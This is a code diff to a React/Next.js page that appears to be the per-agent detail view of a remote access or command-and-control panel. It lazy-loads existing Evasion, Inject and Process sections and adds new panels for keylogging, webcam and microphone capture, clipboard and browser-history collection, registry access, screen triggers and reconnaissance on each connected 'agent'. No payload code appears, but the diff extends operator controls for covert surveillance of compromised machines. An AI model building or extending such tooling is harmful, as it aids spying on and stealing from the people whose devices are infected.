@@ -22,6 +22,7 @@ import { Collapsible, CollapsibleContent } from "@/components/ui/collapsible";
 import { Bug } from "lucide-react";
 import { Banner } from "@/components/ui/banner";
 import { AgentStatus, AgentDetail as AgentDetailExt, AgentTaskRecord } from "@/types/agent";
+import dynamic from "next/dynamic";
 import AgentHeader from "./_components/AgentHeader";
 import AgentDetailChrome from "./_components/AgentDetailChrome";
 import AgentStatsGrid from "./_components/AgentStatsGrid";
@@ -32,12 +33,20 @@ import AgentStatusBar from "./_components/AgentStatusBar";
 import QuickShellSection from "./_components/QuickShellSection";
 import { AISuggestCard } from "./_components/AISuggestCard";
 import NotesTagsSection from "./_components/NotesTagsSection";
-import ProcessSection from "./_components/ProcessSection";
-import ConnectionLogSection from "./_components/ConnectionLogSection";
-import EvasionSection from "./_components/EvasionSection";
-import InjectSection from "./_components/InjectSection";
-import TimelineSection from "./_components/TimelineSection";
-import { HostInfoCard } from "./_components/HostInfoCard";
+// Below-fold sections load on demand so the detail chunk parses faster.
+const ProcessSection = dynamic(() => import("./_components/ProcessSection"), { ssr: false });
+const ConnectionLogSection = dynamic(() => import("./_components/ConnectionLogSection"), { ssr: false });
+const EvasionSection = dynamic(() => import("./_components/EvasionSection"), { ssr: false });
+const InjectSection = dynamic(() => import("./_components/InjectSection"), { ssr: false });
+const TimelineSection = dynamic(() => import("./_components/TimelineSection"), { ssr: false });
+const BrowserHistorySection = dynamic(() => import("./_components/BrowserHistorySection"), { ssr: false });
+const KeyloggerSection = dynamic(() => import("./_components/KeyloggerSection"), { ssr: false });
+const ClipboardSection = dynamic(() => import("./_components/ClipboardSection"), { ssr: false });
+const WebcamMicSection = dynamic(() => import("./_components/WebcamMicSection"), { ssr: false });
+const ScreenTriggerSection = dynamic(() => import("./_components/ScreenTriggerSection"), { ssr: false });
+const RegistrySection = dynamic(() => import("./_components/RegistrySection"), { ssr: false });
+const ReconSection = dynamic(() => import("./_components/ReconSection"), { ssr: false });
+const HostInfoCard = dynamic(() => import("./_components/HostInfoCard").then((m) => ({ default: m.HostInfoCard })), { ssr: false });
 import {
   buildAgentCopyText,
   buildAgentMarkdown,
@@ -518,7 +527,13 @@ export default memo(function AgentDetailPage({ agentId: agentIdProp, onClose }: 
             onNextLightbox={onNextLightbox}
           />
 
+          <ScreenTriggerSection agentId={id} online={status === "online"} />
+
+          <RegistrySection agentId={id} online={status === "online"} />
+
           <ProcessSection
+            agentId={id}
+            online={status === "online"}
             processList={processList}
             loading={processLoading}
             loadFailed={loadFailed}
@@ -532,6 +547,16 @@ export default memo(function AgentDetailPage({ agentId: agentIdProp, onClose }: 
           <InjectSection agentId={id} online={status === "online"} osType={agent.os} />
 
           <TimelineSection agentId={id} online={status === "online"} />
+
+          <BrowserHistorySection agentId={id} online={status === "online"} />
+
+          <KeyloggerSection agentId={id} online={status === "online"} />
+
+          <ClipboardSection agentId={id} online={status === "online"} />
+
+          <WebcamMicSection agentId={id} online={status === "online"} />
+
+          <ReconSection agentId={id} online={status === "online"} />
 
           <HostInfoCard agentId={id} online={status === "online"} />
         </div>
